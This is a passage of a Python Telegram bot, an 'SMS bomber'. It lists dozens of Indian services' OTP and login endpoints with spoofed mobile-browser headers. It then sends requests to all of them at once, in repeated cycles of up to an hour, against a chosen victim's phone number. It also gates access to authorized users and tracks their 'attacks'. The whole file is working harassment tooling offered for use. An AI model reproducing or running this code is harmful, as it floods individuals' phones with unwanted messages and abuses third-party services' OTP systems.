            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
            "priority": "u=1, i"
        },
        "data": lambda p, d: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "Well Academy",
        "url": lambda p, d: "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://wellacademy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://wellacademy.in/store/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        },
        "data": lambda p, d: f'{{"contact_no":"{p}"}}'
    },
    {
        "name": "Hungama Advanced",
        "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "name": "Servetel Advanced",
        "url": lambda p, d: "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "Meru Cab Advanced",
        "url": lambda p, d: "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "BeepKart",
        "url": lambda p, d: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "changesorigin": "product-listingpage",
            "originid": "0",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "appname": "Website",
            "userid": "0",
            "origin": "https://www.beepkart.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.beepkart.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p, d: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}}}'
    },
    {
        "name": "LendingPlate",
        "url": lambda p, d: "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Host": "lendingplate.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://lendingplate.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lendingplate.com/personal-loan",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
        },
        "data": lambda p, d: f"mobiles={p}&resend=Resend&clickcount=3"
    },
    {
        "name": "Snitch",
        "url": lambda p, d: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "client-id": "snitch_secret",
            "Accept-Headers": "application/json",
            "Origin": "https://www.snitch.com",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.snitch.com/",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p, d: f'{{"mobile_number":"+91{p}"}}'
    },
    {
        "name": "Dayco India Advanced",
        "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Priority": "u=1, i"
        },
        "data": lambda p, d: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
    },
    {
        "name": "PenPencil Advanced",
        "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "Otpless",
        "url": lambda p, d: "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://otpless.com",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://otpless.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p, d: f'{{"phoneNumber":"{p}"}}'
    }
]

class UserManager:
    """Manages authorized users with JSON storage"""
    
    def __init__(self, filename=AUTHORIZED_USERS_FILE):
        self.filename = filename
        self.users = self.load_users()
    
    def load_users(self):
        """Load authorized users from JSON file"""
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_users(self):
        """Save authorized users to JSON file"""
        with open(self.filename, 'w') as f:
            json.dump(self.users, f, indent=2)
    
    def add_user(self, user_id, username=None, added_by=ADMIN_ID):
        """Add a user to authorized list"""
        user_id_str = str(user_id)
        self.users[user_id_str] = {
            "user_id": user_id,
            "username": username,
            "added_by": added_by,
            "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_attacks": 0,
            "last_attack": None
        }
        self.save_users()
    
    def remove_user(self, user_id):
        """Remove a user from authorized list"""
        user_id_str = str(user_id)
        if user_id_str in self.users:
            del self.users[user_id_str]
            self.save_users()
            return True
        return False
    
    def is_authorized(self, user_id):
        """Check if user is authorized (admin or in authorized list)"""
        if user_id == ADMIN_ID:
            return True
        return str(user_id) in self.users
    
    def update_stats(self, user_id):
        """Update user attack statistics"""
        user_id_str = str(user_id)
        if user_id_str in self.users:
            self.users[user_id_str]["total_attacks"] += 1
            self.users[user_id_str]["last_attack"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.save_users()
    
    def get_user_info(self, user_id):
        """Get user information"""
        return self.users.get(str(user_id))
    
    def get_all_users(self):
        """Get all authorized users"""
        return self.users

class BomberBot:
    def __init__(self):
        self.active_attacks = {}
        self.user_manager = UserManager()
    
    async def start_bombing(self, phone, duration, user_id):
        if user_id in self.active_attacks:
            return "⚠️ Already bombing! Use /stop first."
        
        if len(phone) != 10 or not phone.isdigit():
            return "❌ Invalid phone! Send 10 digit number."
        
        self.active_attacks[user_id] = {
            "phone": phone, 
            "running": True,
            "start_time": time.time(),
            "success": 0,
            "failed": 0,
            "cycles": 0
        }
        
        # Update user stats
        self.user_manager.update_stats(user_id)
        
        asyncio.create_task(self._bomb_worker(user_id, phone, duration))
        
        return (f"💀 **MEGA BOMBING STARTED!**\n\n"
                f"📱 **Target:** `+91{phone}`\n" 
                f"⏰ **Duration:** {duration} min\n"
                f"📡 **APIs:** {len(APIS)}\n"
                f"🔄 **Auto-Repeat:** YES\n\n"
                f"🛑 Use /stop to stop")
    
    async def stop_bombing(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            stats["running"] = False
            duration = time.time() - stats["start_time"]
            del self.active_attacks[user_id]
            
            return (f"🛑 **BOMBING STOPPED!**\n\n"
                    f"✅ **Success:** {stats['success']}\n"
                    f"❌ **Failed:** {stats['failed']}\n" 
                    f"🔄 **Cycles:** {stats['cycles']}\n"
                    f"⏰ **Duration:** {duration:.1f}s\n"
                    f"📱 **Target:** `+91{stats['phone']}`")
        return "⚠️ No active bombing!"
    
    async def get_stats(self, user_id):
        if user_id in self.active_attacks:
            stats = self.active_attacks[user_id]
            duration = time.time() - stats["start_time"]
            return (f"📊 **LIVE STATS:**\n\n"
                    f"✅ **Success:** {stats['success']}\n"
                    f"❌ **Failed:** {stats['failed']}\n"
                    f"🔄 **Cycles:** {stats['cycles']}\n" 
                    f"⏰ **Duration:** {duration:.1f}s\n"
                    f"📱 **Target:** `+91{stats['phone']}`\n"
                    f"⚡ **Status:** RUNNING...")
        return "ℹ️ No active bombing. Use /bomb to start."
    
    async def _bomb_worker(self, user_id, phone, duration):
        end_time = time.time() + (duration * 60)
        
        while (user_id in self.active_attacks and 
               self.active_attacks[user_id]["running"] and 
               time.time() < end_time):
            
            try:
                self.active_attacks[user_id]["cycles"] += 1
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for api in APIS:
                        if not self.active_attacks[user_id]["running"]:
                            break
                        
                        url = api["url"](phone, duration)
                        headers = api.get("headers", {})
                        data = api["data"](phone, duration) if "data" in api else None
                        
                        task = self._send_request(session, url, api["method"], headers, data, api["name"])
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for success in results:
                        if isinstance(success, bool) and success:
                            self.active_attacks[user_id]["success"] += 1
                        else:
                            self.active_attacks[user_id]["failed"] += 1
                
                await asyncio.sleep(2)
                
            except Exception as e:
                print(f"Bombing error: {e}")
                await asyncio.sleep(5)
        
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
    
    async def _send_request(self, session, url, method, headers, data, api_name):
        try:
            if method == "POST":
                async with session.post(url, headers=headers, data=data, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202]
            else:
                async with session.get(url, headers=headers, timeout=10) as response:
                    print(f"✅ {api_name} - Status: {response.status}")
                    return response.status in [200, 201, 202]
        except Exception as e:
            print(f"❌ {api_name} - Failed: {e}")
            return False

# Initialize bot
bomber = BomberBot()

# Authorization decorator
def admin_only(func):
    """Decorator to restrict commands to admin only"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text(
                "🚫 **ACCESS DENIED**\n\n"
                "❌ This command is for admin only!\n"
                "👤 Contact the bot owner for access."
            )
            return
        return await func(update, context)
    return wrapper

def authorized_only(func):
    """Decorator to restrict commands to authorized users"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not bomber.user_manager.is_authorized(user_id):
            await update.message.reply_text(
                "🚫 **ACCESS DENIED**\n\n"
                "❌ You are not authorized to use this bot!\n"
                "👤 Contact the admin to get access.\n"
                f"🆔 Your ID: `{user_id}`"
            )
            return
        return await func(update, context)
    return wrapper

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    is_admin = user_id == ADMIN_ID
    is_authorized = bomber.user_manager.is_authorized(user_id)
    
    if is_admin:
        message = (
            "👑 **ADMIN PANEL - BOMBER BOT**\n\n"
            "🎯 **User Commands:**\n"
            "├ /bomb <phone> <duration> - Start bombing\n"
            "├ /stop - Stop bombing\n"
            "└ /stats - Show stats\n\n"
            "🔐 **Admin Commands:**\n"
            "├ /add <userid> - Add user\n"
            "├ /remove <userid> - Remove user\n"
            "├ /users - List all users\n"
            "├ /info <userid> - User info\n"
            "└ /botinfo - Bot statistics\n\n"
            f"📡 **APIs Loaded:** {len(APIS)}\n"
            f"👤 **Your ID:** `{user_id}`\n"
            "⚡ **Status:** ADMIN ACCESS"
        )
    elif is_authorized:
        message = (
            "💀 **BOMBER BOT - AUTHORIZED USER**\n\n"
            "📋 **Available Commands:**\n"
            "├ /bomb <phone> <duration> - Start bombing\n"
            "├ /stop - Stop bombing\n"
            "└ /stats - Show stats\n\n"
            "🎯 **Example:**\n"
            "`/bomb 9876543210 5`\n\n"
            f"📡 **APIs:** {len(APIS)}\n"
            f"👤 **Your ID:** `{user_id}`\n"
            "✅ **Status:** AUTHORIZED"
        )
    else:
        message = (
            "🚫 **ACCESS DENIED**\n\n"
            "❌ You are not authorized to use this bot!\n"
            "👤 Contact the admin to get access.\n\n"
            f"🆔 **Your ID:** `{user_id}`\n"
            f"👤 **Username:** @uskimaki\n\n"
            "📝 Send your ID to the admin for authorization."
        )
    
    await update.message.reply_text(message, parse_mode='Markdown')

@authorized_only
async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ **Invalid Usage!**\n\n"
            "📝 **Correct Format:**\n"
            "`/bomb <phone> <duration>`\n\n"
            "🎯 **Example:**\n"
            "`/bomb 9876543210 5`",
            parse_mode='Markdown'
        )
        return
    
    phone, duration = context.args
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Please enter 10 digits.")
        return
    
    try:
        duration = int(duration)
        if duration <= 0 or duration > 60:
            await update.message.reply_text("❌ Invalid duration! Use 1-60 minutes.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Use numbers only.")
        return
    
    result = await bomber.start_bombing(phone, duration, user_id)
    await update.message.reply_text(result, parse_mode='Markdown')

@authorized_only
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    result = await bomber.stop_bombing(user_id)
    await update.message.reply_text(result, parse_mode='Markdown')

@authorized_only
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    result = await bomber.get_stats(user_id)
    await update.message.reply_text(result, parse_mode='Markdown')

@admin_only
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Invalid Usage!**\n\n"
            "📝 **Correct Format:**\n"
            "`/add <userid>`\n\n"
            "🎯 **Example:**\n"
            "`/add 123456789`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_user_id = int(context.args[0])
        
        if bomber.user_manager.is_authorized(new_user_id):
            await update.message.reply_text(f"⚠️ User `{new_user_id}` is already authorized!", parse_mode='Markdown')
            return
        
        bomber.user_manager.add_user(new_user_id)
        await update.message.reply_text(
            f"✅ **User Added Successfully!**\n\n"
            f"🆔 **User ID:** `{new_user_id}`\n"
            f"📅 **Added:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"👤 **Added By:** Admin",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Use numbers only.")

@admin_only
async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Invalid Usage!**\n\n"
            "📝 **Correct Format:**\n"
            "`/remove <userid>`\n\n"
            "🎯 **Example:**\n"
            "`/remove 123456789`",
            parse_mode='Markdown'
        )
        return
    
    try:
        user_id = int(context.args[0])
        
        if user_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin!")
            return
        
        if bomber.user_manager.remove_user(user_id):
            await update.message.reply_text(
                f"✅ **User Removed Successfully!**\n\n"
                f"🆔 **User ID:** `{user_id}`\n"
                f"📅 **Removed:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"❌ User `{user_id}` not found in authorized list!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Use numbers only.")

@admin_only
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = bomber.user_manager.get_all_users()
    
    if not users:
        await update.message.reply_text("📋 No authorized users yet!")
        return
    
    message = "👥 **AUTHORIZED USERS LIST**\n\n"
    
    for idx, (user_id, user_data) in enumerate(users.items(), 1):
        username = user_data.get('username', 'Unknown')
        added_at = user_data.get('added_at', 'N/A')
        total_attacks = user_data.get('total_attacks', 0)
        last_attack = user_data.get('last_attack', 'Never')
        
        message += (
            f"**{idx}. User ID:** `{user_id}`\n"
            f"   ├ Username: @{username}\n"
            f"   ├ Added: {added_at}\n"
            f"   ├ Total Attacks: {total_attacks}\n"
            f"   └ Last Attack: {last_attack}\n\n"
        )
    
    message += f"📊 **Total Users:** {len(users)}"
    await update.message.reply_text(message, parse_mode='Markdown')

@admin_only
async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Invalid Usage!**\n\n"
            "📝 **Correct Format:**\n"
            "`/info <userid>`",
            parse_mode='Markdown'
        )
        return
    
    try:
        user_id = int(context.args[0])
        user_data = bomber.user_manager.get_user_info(user_id)
        
        if not user_data:
            await update.message.reply_text(f"❌ User `{user_id}` not found!", parse_mode='Markdown')
            return
        
        message = (
            f"👤 **USER INFORMATION**\n\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"👤 **Username:** @{user_data.get('username', 'Unknown')}\n"
            f"📅 **Added:** {user_data.get('added_at', 'N/A')}\n"
            f"👤 **Added By:** Admin\n"
            f"📊 **Total Attacks:** {user_data.get('total_attacks', 0)}\n"
            f"⏰ **Last Attack:** {user_data.get('last_attack', 'Never')}"
        )
        await update.message.reply_text(message, parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Use numbers only.")

@admin_only
async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(bomber.user_manager.get_all_users())
    active_attacks = len(bomber.active_attacks)
    
    message = (
        f"🤖 **BOT INFORMATION**\n\n"
        f"📡 **Total APIs:** {len(APIS)}\n"
        f"👥 **Authorized Users:** {total_users}\n"
        f"⚡ **Active Attacks:** {active_attacks}\n"
        f"👑 **Admin ID:** `{ADMIN_ID}`\n"
        f"📅 **Bot Status:** ONLINE\n"
        f"🔐 **Access Control:** ENABLED\n\n"
        f"💾 **Storage:** JSON File\n"
        f"📂 **File:** {AUTHORIZED_USERS_FILE}"
    )
    await update.message.reply_text(message, parse_mode='Markdown')

def main():
    try:
        # Create application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # User commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("bomb", bomb))
        app.add_handler(CommandHandler("stop", stop))
        app.add_handler(CommandHandler("stats", stats))
        
        # Admin commands
        app.add_handler(CommandHandler("add", add_user))
        app.add_handler(CommandHandler("remove", remove_user))
        app.add_handler(CommandHandler("users", list_users))
        app.add_handler(CommandHandler("info", user_info))
        app.add_handler(CommandHandler("botinfo", bot_info))
        
        print("=" * 50)
        print("🤖  BOMBER BOT STARTED!")
        print(f"📡 Loaded {len(APIS)} APIs")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"🔐 Access Control: ENABLED")
        print("=" * 50)
        
        # Run the bot with proper error handling
        app.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot failed to start: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()